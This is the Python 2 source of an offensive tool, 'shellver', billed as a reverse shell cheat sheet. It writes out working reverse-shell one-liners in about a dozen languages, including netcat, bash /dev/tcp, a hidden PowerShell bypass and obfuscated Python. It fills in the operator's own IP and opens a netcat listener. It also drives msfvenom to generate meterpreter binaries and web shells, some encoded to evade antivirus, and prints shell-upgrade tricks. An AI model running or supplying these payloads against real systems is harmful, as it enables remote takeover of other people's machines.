#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse, sys, os, re, socket, subprocess
from requests import get
from random import choice

def resize():
	os.system("resize -s 33 95")
	os.system("clear")


def shell():
	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
	lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
	wan = get('https://api.ipify.org').text
	print choice(color) + "For lan enter 1:",(lan)
	print choice(color) + "For wan enter 2:",(wan)
	cw = raw_input("Which one do you want lan or wan : ")
        if cw == '1':
		 ipp = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        if cw == '2':
		 ipp = get('https://api.ipify.org').text
	port = raw_input("Select listening port : ")
	#os.system("resize -s 43 92")
	#os.system("clear")
		
	rev = """
╔Bash TCP═══════════════════════════════════════════
║ bash -i >& /dev/tcp/xxx/yyy 0>&1						    
║═══════════════════════════════════════════════════
║ 0<&196;exec 196<>/dev/tcp/xxx/yyy; sh <&196 >&196 2>&196  
╚═══════════════════════════════════════════════════
╔Bash UDP═════════════╦═════════════════════════════
║ Run Target Machine  ║ sh -i >& /dev/udp/xxx/yyy 0>&1   
╚═════════════════════╩═════════════════════════════
╔PERL═══════════════════════════════════════════════
║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
╔═══════════════════════════════════════════════════																																												
║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'									
											 
╔══════════════╦════════════════════════════════════
║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'																					
  
════════════════════════════════════════════════════																																												
╔PYTHON═════════════════════════════════════════════ 
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'    
╔═══════════════════════════════════════════════════																																												
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
╔═══════════════════════════════════════════════════
║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
     
════════════════════════════════════════════════════
╔PHP════════════════════════════════════════════════
║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
╚═══════════════════════════════════════════════════
╔RUBY═══════════════════════════════════════════════
║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
                        
╔═══════════════════════════════════════════════════
║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  
╔══════════════╦════════════════════════════════════
║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  
════════════════════════════════════════════════════
╔Netcat Traditional═════════════════════════════════
║ nc -e /bin/sh xxx yyy
╚═══════════════════════════════════════════════════
╔Netcat OpenBsd═════════════════════════════════════
║ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx yyy >/tmp/f	
╚═══════════════════════════════════════════════════
╔NCAT═══════════════════════════════════════════════
║ ncat xxx yyy -e /bin/bash		   
║═══════════════════════════════════════════════════
║ ncat --udp xxx yyy -e /bin/bash  
╚═══════════════════════════════════════════════════
╔POWERSHELL═════════════════════════════════════════ 
║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  
╔═══════════════════════════════════════════════════																																												
║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx',yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
════════════════════════════════════════════════════
╔AWK════════════════════════════════════════════════ 
║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
════════════════════════════════════════════════════																																												
╔JAWA═══════════════════════════════════════════════ 
║ r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
════════════════════════════════════════════════════																																												
╔LUA══════════╦═════════════════════════════════════
║ Linux only  ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');"
════════════════════════════════════════════════════
╔════════════════════╦══════════════════════════════
║ Windows and Linux  ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
════════════════════════════════════════════════════
╔NODEJS═════════════════════════════════════════════ 
║(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(yyy, "xxx", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
╔═════╦═════════════════════════════════════════════
║ OR  ║ require('child_process').exec('nc -e /bin/sh xxx yyy')
╚═════╩═════════════════════════════════════════════
╔═════╦═════════════════════════════════════════════
║ OR  ║ -var x = global.process.mainModule.require
-x('child_process').exec('nc xxx yyy -e /bin/bash')
════════════════════════════════════════════════════
╔JAWA For GROOVY════════════════════════════════════ 
║ String host="xxx";
int port=yyy;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
════════════════════════════════════════════════════"""
	
	x = open("reverse.txt", "wb")
	x.write(rev)
	x.close()
	print choice(color) + ""
	subprocess.call(["sed", "s/xxx/"+ipp+"/"";""s/yyy/"+port+"/", "reverse.txt"])
	
	
	
	print "\n"
	print choice(color) + "		|--Shell Spawning--|For Details use shellver spawn--|"
	print choice(color) + "[+] python -c \'import pty; pty.spawn(\"/bin/sh\")\' "
	print choice(color) + "[+] perl -e 'exec \"/bin/sh\";\' "
	print choice(color) + "[+] /bin/sh -i "
	print "\n"
	os.system("nc -lvp {}".format(port))
	
def payload():
	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
	    
	ven = raw_input("Enter Payload :")
	lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
	wan = get('https://api.ipify.org').text
	print choice(color) + "For lan enter 1:",(lan)
	print choice(color) + "For wan enter 2:",(wan)
	cw = raw_input("Which one do you want selected Payload lan or wan : ")
        if cw == '1':
		 ipp = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        if cw == '2':
		 ipp = get('https://api.ipify.org').text
	port = raw_input("Select listening port : ")

	
		#Binaries
        if ven == '1':
        	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > /root/Desktop/shell.elf'.format (ipp,port))
        if ven == '2':
        	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -e x86/shikata_ga_nai -i 20 > /root/Desktop/shell.exe'.format (ipp,port))
        if ven == '3':
        	os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho > /root/Desktop/shell.macho'.format (ipp,port))
        #Web Payloads
        if ven == '4':
        	os.system('msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw > /root/Desktop/shell.php'.format (ipp,port))
        if ven == '5':	
        	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f asp > /root/Desktop/shell.asp'.format (ipp,port))
        if ven == '6':	
        	os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw > /root/Desktop/shell.jsp'.format (ipp,port))
        if ven == '7':	
        	os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war > /root/Desktop/shell.war'.format (ipp,port))
        if ven == '8':	
        	os.system('msfvenom -p cmd/unix/reverse_nodejs LHOST={} LPORT={} -f war > /root/Desktop/shell.js'.format (ipp,port))
        
        
        #Scrippting Payloads	
        if ven == '9':
        	os.system('msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw > /root/Desktop/shell.py'.format (ipp,port))
        if ven == '10':	
        	os.system('msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw > /root/Desktop/shell.sh'.format (ipp,port))
        if ven == '11':	
        	os.system('msfvenom -p cmd/unix/reverse_perl LHOST={} LPORT={} -f raw > /root/Desktop/shell.pl'.format (ipp,port))
        if ven == '12':	
        	os.system('msfvenom -p cmd/unix/reverse_ruby LHOST={} LPORT={} -f raw > /root/Desktop/shell.rb'.format (ipp,port))
        	
        #Shellcode
        if ven == '13':
        	dil = raw_input("Enter Language: ")
        	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} > /root/Desktop/shellcode'.format (ipp,port,dil))
        if ven == '14':
        	dil = raw_input("Enter Language: ")
        	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} > /root/Desktop/shellcode'.format (ipp,port,dil))
        if ven == '15':
        	dil = raw_input("Enter Language: ")
        	os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f {} > /root/Desktop/shellcode'.format (ipp,port,dil))

	
def banner():

	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']

	print choice(color) + ''' 
				  ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
				  ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
				  ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─
					 .:: 0xR ::.
			    .:: Reverse Shell Cheat Sheet Tool ::.
				   .:: cyber-warrior.org ::. 
	'''



def main(arg):

	
	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
	resize()
	parser = argparse.ArgumentParser()
	parser.add_argument("use", help="shellver msf or shell or spawn ")
	args = parser.parse_args()
	banner()
	if args.use == "shell":
		shell()
	if args.use == "msf":
		print choice(color) + """         
		______________________________________________________________           
		                                                                                   
				Creating Metasploit Payloads                                              
	 ______________________________________________________________________________    
	|              |                 |                       |                     |   
	| #Binaries    |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |   
	|______________|_________________|_______________________|_____________________|   
	|              |                 |                       |                     |   
	| 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux Based     |   
	|              |                 |                       |                     |   
	| 2) Windows   | 5) ASP          | 10) Bash              | 14) Windows Based   |   
	|              |                 |                       |                     |   
	| 3) Mac       | 6) JSP          | 11) Perl              | 15) Mac Based       |   
	|              |                 |                       |                     |   
	|              | 7) WAR          | 12) Ruby              |                     |   
	|              |                 |                       |                     |   
	|              | 8) Nodejs       |                       |                     |
	|______________|_________________|_______________________|_____________________| 
"""								
		payload()
	
	
	
	if args.use == "spawn":	
		print choice(color) + """
|--Shell Spawning--|
------------
/bin/sh -i
(From an interpreter)
python -c 'import pty; pty.spawn("/bin/sh")'
------------
perl -e 'exec "/bin/sh";'
------------
perl: exec "/bin/sh";
------------
ruby: exec "/bin/sh"
------------
lua: os.execute('/bin/sh')
Access shortcuts, su, nano and autocomplete in a partially tty shell /!\ OhMyZSH might break this trick, a simple sh is recommended
------------
# in host
------------
ctrl+z
stty raw -echo
fg
# in reverse shell
------------
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
(From within vi)
------------
:!bash
:set shell=/bin/bash:shell
(From within nmap)
------------
!sh"""
	if args.use == "how":	
		print choice(color) + """ run "shellver msf" or "shellver shell" or "shellver spawn" """
		
		
	if args.use != "shell" and args.use != "spawn" and args.use != "msf" and args.use != "how":
		print choice(color) + 'Type "python shell.py -h" or "shell -h" for options'
if __name__ == '__main__':
   main(sys.argv[1:])
exit()
